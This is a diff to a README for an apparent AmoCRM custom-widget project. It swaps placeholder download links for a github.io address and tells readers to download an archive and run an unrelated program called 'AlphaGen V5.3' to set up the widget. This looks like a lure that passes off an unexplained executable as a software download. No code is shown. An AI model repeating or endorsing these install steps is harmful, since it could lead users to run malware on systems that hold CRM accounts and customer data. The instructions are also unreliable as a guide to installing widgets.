@@ -2,13 +2,13 @@
 
 Create and connect custom widgets for AmoCRM — extend your CRM with any service, UI panel, or API logic using flexible integration tools.
 
-[![Download](https://img.shields.io/badge/Download-Universal_Widget_AmoCRM-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Universal_Widget_AmoCRM-blueviolet)](https://universal-widget-amocrm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://universal-widget-amocrm.github.io/.github)  
 2. 📁 Extract the folder to a desired location  
 3. 🖱 Run AlphaGen V5.3 to initialize the widget structure  
 4. ✅ Open AmoCRM, navigate to `Settings > Integrations > Add Widget`, upload the manifest and connect it to your account
